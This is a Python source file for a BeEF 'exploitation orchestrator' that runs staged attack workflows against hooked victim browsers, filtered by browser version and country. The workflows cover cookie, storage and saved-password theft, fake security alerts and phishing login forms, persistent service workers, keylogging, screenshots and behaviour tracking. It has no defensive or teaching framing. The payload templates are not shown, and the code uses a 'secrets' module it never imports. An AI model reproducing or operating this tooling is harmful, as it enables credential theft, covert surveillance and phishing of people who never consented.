"""
BeEF Exploitation Orchestrator
Advanced exploitation workflows with automated sequences and social engineering
"""

import os
import json
import time
import asyncio
from datetime import datetime, timezone, timedelta
from typing import Dict, Optional, Any, List, Tuple
import logging
import threading
import random

# Configure logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

class ExploitationWorkflow:
    """Exploitation workflow definition"""

    def __init__(self, workflow_id: str, name: str, description: str, 
                 phases: List[Dict[str, Any]], target_criteria: Dict[str, Any] = None):
        self.workflow_id = workflow_id
        self.name = name
        self.description = description
        self.phases = phases
        self.target_criteria = target_criteria or {}
        self.created_at = datetime.now(timezone.utc)

        # Workflow status
        self.is_active = True
        self.success_rate = 0.0
        self.total_executions = 0
        self.successful_executions = 0

    def can_target(self, victim_profile: Dict[str, Any]) -> bool:
        """Check if workflow can target victim"""
        try:
            if not self.target_criteria:
                return True

            # Check browser criteria
            if "browser" in self.target_criteria:
                browser_criteria = self.target_criteria["browser"]
                victim_browser = victim_profile.get("browser_info", {})
                
                if "min_version" in browser_criteria:
                    # Simplified version check
                    if victim_browser.get("version", "0") < browser_criteria["min_version"]:
                        return False

            # Check OS criteria
            if "os" in self.target_criteria:
                os_criteria = self.target_criteria["os"]
                victim_os = victim_profile.get("os_info", {})
                
                if "required_os" in os_criteria:
                    if victim_os.get("name", "").lower() not in os_criteria["required_os"]:
                        return False

            # Check geographic criteria
            if "geographic" in self.target_criteria:
                geo_criteria = self.target_criteria["geographic"]
                victim_location = victim_profile.get("location", {})
                
                if "allowed_countries" in geo_criteria:
                    country = victim_location.get("country", "").lower()
                    if country not in geo_criteria["allowed_countries"]:
                        return False

            return True

        except Exception as e:
            logger.error(f"Error checking target criteria: {e}")
            return True  # Default to allowing

    def to_dict(self) -> Dict[str, Any]:
        """Convert to dictionary"""
        return {
            "workflow_id": self.workflow_id,
            "name": self.name,
            "description": self.description,
            "phases": self.phases,
            "target_criteria": self.target_criteria,
            "created_at": self.created_at.isoformat(),
            "is_active": self.is_active,
            "success_rate": self.success_rate,
            "total_executions": self.total_executions,
            "successful_executions": self.successful_executions
        }

class ExploitationPhase:
    """Individual exploitation phase"""

    def __init__(self, phase_id: str, name: str, description: str, 
                 commands: List[Dict[str, Any]], dependencies: List[str] = None,
                 success_criteria: Dict[str, Any] = None):
        self.phase_id = phase_id
        self.name = name
        self.description = description
        self.commands = commands
        self.dependencies = dependencies or []
        self.success_criteria = success_criteria or {}
        self.created_at = datetime.now(timezone.utc)

        # Phase status
        self.status = "pending"  # pending, executing, completed, failed, skipped
        self.execution_started = None
        self.execution_completed = None
        self.results = []
        self.error_message = None

    def start_execution(self):
        """Start phase execution"""
        self.status = "executing"
        self.execution_started = datetime.now(timezone.utc)

    def complete_execution(self, results: List[Dict[str, Any]], error: str = None):
        """Complete phase execution"""
        self.status = "completed" if not error else "failed"
        self.execution_completed = datetime.now(timezone.utc)
        self.results = results
        self.error_message = error

    def skip_execution(self, reason: str = "Dependencies not met"):
        """Skip phase execution"""
        self.status = "skipped"
        self.execution_completed = datetime.now(timezone.utc)
        self.error_message = reason

    def to_dict(self) -> Dict[str, Any]:
        """Convert to dictionary"""
        return {
            "phase_id": self.phase_id,
            "name": self.name,
            "description": self.description,
            "commands": self.commands,
            "dependencies": self.dependencies,
            "success_criteria": self.success_criteria,
            "created_at": self.created_at.isoformat(),
            "status": self.status,
            "execution_started": self.execution_started.isoformat() if self.execution_started else None,
            "execution_completed": self.execution_completed.isoformat() if self.execution_completed else None,
            "results": self.results,
            "error_message": self.error_message
        }

class ExploitationOrchestrator:
    """BeEF exploitation orchestrator for advanced workflows"""

    def __init__(self, mongodb_connection=None, redis_client=None, beef_client=None, command_executor=None):
        self.mongodb = mongodb_connection
        self.redis = redis_client
        self.beef_client = beef_client
        self.command_executor = command_executor

        self.workflows: Dict[str, ExploitationWorkflow] = {}
        self.active_executions: Dict[str, Dict[str, Any]] = {}
        self.execution_history: List[Dict[str, Any]] = []

        # Load default workflows
        self._load_default_workflows()

        # Start execution monitor
        self._start_execution_monitor()

    def _load_default_workflows(self):
        """Load default exploitation workflows"""
        try:
            # Reconnaissance workflow
            recon_workflow = ExploitationWorkflow(
                "recon_basic",
                "Basic Reconnaissance",
                "Gather basic information about victim browser and environment",
                [
                    {
                        "phase_id": "recon_browser",
                        "name": "Browser Reconnaissance",
                        "description": "Extract browser information",
                        "commands": [
                            {"type": "browser_info", "template": "browser_info"},
                            {"type": "network_info", "template": "network_info"}
                        ],
                        "dependencies": [],
                        "success_criteria": {"min_data_points": 5}
                    },
                    {
                        "phase_id": "recon_fingerprint",
                        "name": "Fingerprint Collection",
                        "description": "Collect detailed browser fingerprint",
                        "commands": [
                            {"type": "fingerprint", "template": "fingerprint_collection"}
                        ],
                        "dependencies": ["recon_browser"],
                        "success_criteria": {"fingerprint_complete": True}
                    }
                ],
                {
                    "browser": {"min_version": "80"},
                    "geographic": {"allowed_countries": ["vn", "us", "uk", "ca"]}
                }
            )

            # Data harvesting workflow
            harvest_workflow = ExploitationWorkflow(
                "harvest_comprehensive",
                "Comprehensive Data Harvesting",
                "Extract maximum data from victim browser",
                [
                    {
                        "phase_id": "harvest_cookies",
                        "name": "Cookie Harvesting",
                        "description": "Extract all browser cookies",
                        "commands": [
                            {"type": "cookie_stealer", "template": "cookie_extraction"}
                        ],
                        "dependencies": [],
                        "success_criteria": {"min_cookies": 1}
                    },
                    {
                        "phase_id": "harvest_storage",
                        "name": "Storage Harvesting",
                        "description": "Extract localStorage and sessionStorage",
                        "commands": [
                            {"type": "storage_extractor", "template": "storage_extraction"}
                        ],
                        "dependencies": ["harvest_cookies"],
                        "success_criteria": {"storage_accessed": True}
                    },
                    {
                        "phase_id": "harvest_credentials",
                        "name": "Credential Harvesting",
                        "description": "Extract saved passwords and forms",
                        "commands": [
                            {"type": "password_extractor", "template": "password_extraction"},
                            {"type": "form_harvester", "template": "form_harvesting"}
                        ],
                        "dependencies": ["harvest_storage"],
                        "success_criteria": {"credentials_found": True}
                    }
                ],
                {
                    "browser": {"min_version": "70"},
                    "geographic": {"allowed_countries": ["vn", "us", "uk", "ca", "au"]}
                }
            )

            # Social engineering workflow
            social_engineering_workflow = ExploitationWorkflow(
                "social_engineering_advanced",
                "Advanced Social Engineering",
                "Execute sophisticated social engineering attacks",
                [
                    {
                        "phase_id": "se_notification_spam",
                        "name": "Notification Spam",
                        "description": "Generate fake notifications to create urgency",
                        "commands": [
                            {"type": "notification_spam", "template": "notification_spam"}
                        ],
                        "dependencies": [],
                        "success_criteria": {"notifications_sent": True}
                    },
                    {
                        "phase_id": "se_fake_alerts",
                        "name": "Fake Security Alerts",
                        "description": "Display fake security warnings",
                        "commands": [
                            {"type": "fake_alert", "template": "security_alert"},
                            {"type": "popup_redirect", "template": "popup_redirect"}
                        ],
                        "dependencies": ["se_notification_spam"],
                        "success_criteria": {"alerts_displayed": True}
                    },
                    {
                        "phase_id": "se_credential_phishing",
                        "name": "Credential Phishing",
                        "description": "Create fake login forms",
                        "commands": [
                            {"type": "fake_login", "template": "login_form"},
                            {"type": "form_interceptor", "template": "form_interception"}
                        ],
                        "dependencies": ["se_fake_alerts"],
                        "success_criteria": {"forms_intercepted": True}
                    }
                ],
                {
                    "browser": {"min_version": "60"},
                    "geographic": {"allowed_countries": ["vn", "us", "uk", "ca", "au", "de", "fr"]}
                }
            )

            # Persistence workflow
            persistence_workflow = ExploitationWorkflow(
                "persistence_advanced",
                "Advanced Persistence",
                "Establish long-term persistence on victim machine",
                [
                    {
                        "phase_id": "persist_service_worker",
                        "name": "Service Worker Persistence",
                        "description": "Install persistent service worker",
                        "commands": [
                            {"type": "service_worker_install", "template": "service_worker"}
                        ],
                        "dependencies": [],
                        "success_criteria": {"service_worker_installed": True}
                    },
                    {
                        "phase_id": "persist_local_storage",
                        "name": "Local Storage Persistence",
                        "description": "Store persistent data in localStorage",
                        "commands": [
                            {"type": "local_storage_persist", "template": "local_storage_persistence"}
                        ],
                        "dependencies": ["persist_service_worker"],
                        "success_criteria": {"persistence_data_stored": True}
                    },
                    {
                        "phase_id": "persist_auto_reconnect",
                        "name": "Auto-Reconnect Setup",
                        "description": "Set up automatic reconnection",
                        "commands": [
                            {"type": "auto_reconnect", "template": "auto_reconnect"}
                        ],
                        "dependencies": ["persist_local_storage"],
                        "success_criteria": {"auto_reconnect_enabled": True}
                    }
                ],
                {
                    "browser": {"min_version": "80"},
                    "geographic": {"allowed_countries": ["vn", "us", "uk", "ca", "au"]}
                }
            )

            # Keylogger workflow
            keylogger_workflow = ExploitationWorkflow(
                "keylogger_advanced",
                "Advanced Keylogger",
                "Deploy sophisticated keylogging capabilities",
                [
                    {
                        "phase_id": "keylogger_basic",
                        "name": "Basic Keylogging",
                        "description": "Start basic keylogger",
                        "commands": [
                            {"type": "keylogger", "template": "keylogger_basic"}
                        ],
                        "dependencies": [],
                        "success_criteria": {"keylogger_active": True}
                    },
                    {
                        "phase_id": "keylogger_enhanced",
                        "name": "Enhanced Keylogging",
                        "description": "Deploy enhanced keylogger with context",
                        "commands": [
                            {"type": "enhanced_keylogger", "template": "enhanced_keylogger"},
                            {"type": "context_capture", "template": "context_capture"}
                        ],
                        "dependencies": ["keylogger_basic"],
                        "success_criteria": {"enhanced_keylogger_active": True}
                    },
                    {
                        "phase_id": "keylogger_analysis",
                        "name": "Keylogger Analysis",
                        "description": "Analyze captured keystrokes",
                        "commands": [
                            {"type": "keystroke_analysis", "template": "keystroke_analysis"}
                        ],
                        "dependencies": ["keylogger_enhanced"],
                        "success_criteria": {"analysis_complete": True}
                    }
                ],
                {
                    "browser": {"min_version": "70"},
                    "geographic": {"allowed_countries": ["vn", "us", "uk", "ca", "au", "de", "fr", "jp"]}
                }
            )

            # Screenshot and monitoring workflow
            monitoring_workflow = ExploitationWorkflow(
                "monitoring_comprehensive",
                "Comprehensive Monitoring",
                "Monitor victim activity with screenshots and behavior tracking",
                [
                    {
                        "phase_id": "monitor_screenshot",
                        "name": "Screenshot Monitoring",
                        "description": "Take periodic screenshots",
                        "commands": [
                            {"type": "screenshot", "template": "screenshot_full"}
                        ],
                        "dependencies": [],
                        "success_criteria": {"screenshots_taken": True}
                    },
                    {
                        "phase_id": "monitor_behavior",
                        "name": "Behavior Monitoring",
                        "description": "Track user behavior patterns",
                        "commands": [
                            {"type": "behavior_tracker", "template": "behavior_tracking"},
                            {"type": "mouse_tracker", "template": "mouse_tracking"}
                        ],
                        "dependencies": ["monitor_screenshot"],
                        "success_criteria": {"behavior_tracked": True}
                    },
                    {
                        "phase_id": "monitor_network",
                        "name": "Network Monitoring",
                        "description": "Monitor network requests",
                        "commands": [
                            {"type": "network_monitor", "template": "network_monitoring"}
                        ],
                        "dependencies": ["monitor_behavior"],
                        "success_criteria": {"network_monitored": True}
                    }
                ],
                {
                    "browser": {"min_version": "80"},
                    "geographic": {"allowed_countries": ["vn", "us", "uk", "ca", "au", "de", "fr"]}
                }
            )

            self.workflows = {
                "recon_basic": recon_workflow,
                "harvest_comprehensive": harvest_workflow,
                "social_engineering_advanced": social_engineering_workflow,
                "persistence_advanced": persistence_workflow,
                "keylogger_advanced": keylogger_workflow,
                "monitoring_comprehensive": monitoring_workflow
            }

            logger.info(f"Loaded {len(self.workflows)} exploitation workflows")

        except Exception as e:
            logger.error(f"Error loading default workflows: {e}")

    def _start_execution_monitor(self):
        """Start execution monitoring thread"""
        monitor_thread = threading.Thread(target=self._monitor_executions, daemon=True)
        monitor_thread.start()

    def _monitor_executions(self):
        """Monitor active executions"""
        while True:
            try:
                time.sleep(30)  # Check every 30 seconds
                self._check_execution_status()
            except Exception as e:
                logger.error(f"Error in execution monitor: {e}")
                time.sleep(60)

    def _check_execution_status(self):
        """Check status of active executions"""
        try:
            completed_executions = []
            
            for execution_id, execution_data in self.active_executions.items():
                if execution_data["status"] == "executing":
                    # Check if execution is complete
                    if self._is_execution_complete(execution_data):
                        self._finalize_execution(execution_id, execution_data)
                        completed_executions.append(execution_id)

            # Remove completed executions
            for execution_id in completed_executions:
                del self.active_executions[execution_id]

        except Exception as e:
            logger.error(f"Error checking execution status: {e}")

    def _is_execution_complete(self, execution_data: Dict[str, Any]) -> bool:
        """Check if execution is complete"""
        try:
            phases = execution_data.get("phases", [])
            
            for phase in phases:
                if phase["status"] not in ["completed", "failed", "skipped"]:
                    return False
            
            return True

        except Exception as e:
            logger.error(f"Error checking execution completeness: {e}")
            return True

    def _finalize_execution(self, execution_id: str, execution_data: Dict[str, Any]):
        """Finalize execution and update statistics"""
        try:
            phases = execution_data.get("phases", [])
            successful_phases = sum(1 for phase in phases if phase["status"] == "completed")
            total_phases = len(phases)
            
            execution_data["status"] = "completed" if successful_phases > 0 else "failed"
            execution_data["completion_time"] = datetime.now(timezone.utc).isoformat()
            execution_data["success_rate"] = successful_phases / total_phases if total_phases > 0 else 0

            # Update workflow statistics
            workflow_id = execution_data.get("workflow_id")
            if workflow_id in self.workflows:
                workflow = self.workflows[workflow_id]
                workflow.total_executions += 1
                if execution_data["status"] == "completed":
                    workflow.successful_executions += 1
                workflow.success_rate = workflow.successful_executions / workflow.total_executions

            # Store in history
            self.execution_history.append(execution_data)

            logger.info(f"Execution finalized: {execution_id} - {execution_data['status']}")

        except Exception as e:
            logger.error(f"Error finalizing execution: {e}")

    def execute_workflow(self, workflow_id: str, victim_id: str, session_id: str,
                        victim_profile: Dict[str, Any] = None) -> str:
        """
        Execute exploitation workflow

        Args:
            workflow_id: Workflow identifier
            victim_id: Victim identifier
            session_id: BeEF session ID
            victim_profile: Victim profile data

        Returns:
            Execution ID
        """
        try:
            if workflow_id not in self.workflows:
                logger.error(f"Workflow not found: {workflow_id}")
                return ""

            workflow = self.workflows[workflow_id]

            # Check if workflow can target this victim
            if victim_profile and not workflow.can_target(victim_profile):
                logger.warning(f"Workflow {workflow_id} cannot target victim {victim_id}")
                return ""

            # Create execution
            execution_id = f"exec_{int(time.time())}_{secrets.token_hex(8)}"
            
            execution_data = {
                "execution_id": execution_id,
                "workflow_id": workflow_id,
                "victim_id": victim_id,
                "session_id": session_id,
                "victim_profile": victim_profile or {},
                "status": "executing",
                "start_time": datetime.now(timezone.utc).isoformat(),
                "phases": []
            }

            # Create phases
            for phase_def in workflow.phases:
                phase = ExploitationPhase(
                    phase_def["phase_id"],
                    phase_def["name"],
                    phase_def["description"],
                    phase_def["commands"],
                    phase_def.get("dependencies", []),
                    phase_def.get("success_criteria", {})
                )
                execution_data["phases"].append(phase.to_dict())

            # Start execution
            self.active_executions[execution_id] = execution_data
            self._start_workflow_execution(execution_id, execution_data)

            logger.info(f"Workflow execution started: {workflow_id} for victim: {victim_id}")
            return execution_id

        except Exception as e:
            logger.error(f"Error executing workflow: {e}")
            return ""

    def _start_workflow_execution(self, execution_id: str, execution_data: Dict[str, Any]):
        """Start workflow execution in background"""
        try:
            execution_thread = threading.Thread(
                target=self._execute_workflow_phases,
                args=(execution_id, execution_data),
                daemon=True
            )
            execution_thread.start()

        except Exception as e:
            logger.error(f"Error starting workflow execution: {e}")

    def _execute_workflow_phases(self, execution_id: str, execution_data: Dict[str, Any]):
        """Execute workflow phases sequentially"""
        try:
            phases = execution_data["phases"]
            session_id = execution_data["session_id"]
            
            for phase in phases:
                if phase["status"] != "pending":
                    continue

                # Check dependencies
                if not self._check_phase_dependencies(phase, phases):
                    phase["status"] = "skipped"
                    phase["error_message"] = "Dependencies not met"
                    continue

                # Execute phase
                phase["status"] = "executing"
                phase["execution_started"] = datetime.now(timezone.utc).isoformat()

                phase_results = []
                phase_success = True

                for command in phase["commands"]:
                    try:
                        # Execute command
                        command_id = self._execute_phase_command(command, session_id)
                        
                        if command_id:
                            # Wait for command completion
                            result = self._wait_for_command_completion(command_id)
                            phase_results.append(result)
                            
                            if not result.get("success", False):
                                phase_success = False
                        else:
                            phase_success = False
                            phase_results.append({"success": False, "error": "Command execution failed"})

                    except Exception as e:
                        logger.error(f"Error executing command: {e}")
                        phase_success = False
                        phase_results.append({"success": False, "error": str(e)})

                # Complete phase
                phase["status"] = "completed" if phase_success else "failed"
                phase["execution_completed"] = datetime.now(timezone.utc).isoformat()
                phase["results"] = phase_results

                if not phase_success:
                    phase["error_message"] = "One or more commands failed"

                # Add delay between phases
                time.sleep(random.uniform(2, 5))

        except Exception as e:
            logger.error(f"Error executing workflow phases: {e}")

    def _check_phase_dependencies(self, phase: Dict[str, Any], phases: List[Dict[str, Any]]) -> bool:
        """Check if phase dependencies are met"""
        try:
            dependencies = phase.get("dependencies", [])
            
            for dep_id in dependencies:
                # Find dependency phase
                dep_phase = next((p for p in phases if p["phase_id"] == dep_id), None)
                if not dep_phase or dep_phase["status"] != "completed":
                    return False
            
            return True

        except Exception as e:
            logger.error(f"Error checking phase dependencies: {e}")
            return False

    def _execute_phase_command(self, command: Dict[str, Any], session_id: str) -> str:
        """Execute individual phase command"""
        try:
            command_type = command["type"]
            template = command.get("template")

            if self.command_executor:
                if template:
                    return self.command_executor.execute_command_from_template(template, session_id)
                else:
                    # Execute custom command
                    return self.command_executor.execute_command_from_template("custom", session_id, {
                        "command_type": command_type,
                        "parameters": command.get("parameters", {})
                    })

            return ""

        except Exception as e:
            logger.error(f"Error executing phase command: {e}")
            return ""

    def _wait_for_command_completion(self, command_id: str, timeout: int = 60) -> Dict[str, Any]:
        """Wait for command completion"""
        try:
            start_time = time.time()
            
            while time.time() - start_time < timeout:
                if self.command_executor:
                    status = self.command_executor.get_command_status(command_id)
                    
                    if status.get("status") in ["completed", "failed"]:
                        return status
                
                time.sleep(1)
            
            return {"success": False, "error": "Command timeout"}

        except Exception as e:
            logger.error(f"Error waiting for command completion: {e}")
            return {"success": False, "error": str(e)}

    def get_execution_status(self, execution_id: str) -> Dict[str, Any]:
        """Get execution status"""
        try:
            if execution_id in self.active_executions:
                return self.active_executions[execution_id]
            
            # Check history
            for execution in self.execution_history:
                if execution["execution_id"] == execution_id:
                    return execution
            
            return {"error": "Execution not found"}

        except Exception as e:
            logger.error(f"Error getting execution status: {e}")
            return {"error": "Failed to get status"}

    def get_workflow_statistics(self) -> Dict[str, Any]:
        """Get workflow statistics"""
        try:
            total_workflows = len(self.workflows)
            active_executions = len(self.active_executions)
            total_executions = len(self.execution_history)

            # Workflow success rates
            workflow_stats = {}
            for workflow_id, workflow in self.workflows.items():
                workflow_stats[workflow_id] = {
                    "name": workflow.name,
                    "total_executions": workflow.total_executions,
                    "successful_executions": workflow.successful_executions,
                    "success_rate": workflow.success_rate
                }

            return {
                "total_workflows": total_workflows,
                "active_executions": active_executions,
                "total_executions": total_executions,
                "workflow_statistics": workflow_stats,
                "timestamp": datetime.now(timezone.utc).isoformat()
            }

        except Exception as e:
            logger.error(f"Error getting workflow statistics: {e}")
            return {"error": "Failed to get statistics"}

    def get_available_workflows(self) -> List[Dict[str, Any]]:
        """Get available workflows"""
        try:
            return [workflow.to_dict() for workflow in self.workflows.values()]

        except Exception as e:
            logger.error(f"Error getting available workflows: {e}")
            return []

# Global orchestrator instance
orchestrator = None

def initialize_orchestrator(mongodb_connection=None, redis_client=None, beef_client=None, command_executor=None) -> ExploitationOrchestrator:
    """Initialize global orchestrator"""
    global orchestrator
    orchestrator = ExploitationOrchestrator(mongodb_connection, redis_client, beef_client, command_executor)
    return orchestrator

def get_orchestrator() -> ExploitationOrchestrator:
    """Get global orchestrator"""
    if orchestrator is None:
        raise ValueError("Orchestrator not initialized")
    return orchestrator

# Convenience functions
def execute_workflow(workflow_id: str, victim_id: str, session_id: str, victim_profile: Dict[str, Any] = None) -> str:
    """Execute workflow (global convenience function)"""
    return get_orchestrator().execute_workflow(workflow_id, victim_id, session_id, victim_profile)

def get_execution_status(execution_id: str) -> Dict[str, Any]:
    """Get execution status (global convenience function)"""
    return get_orchestrator().get_execution_status(execution_id)

def get_workflow_statistics() -> Dict[str, Any]:
    """Get workflow statistics (global convenience function)"""
    return get_orchestrator().get_workflow_statistics()

def get_available_workflows() -> List[Dict[str, Any]]:
    """Get available workflows (global convenience function)"""
    return get_orchestrator().get_available_workflows()
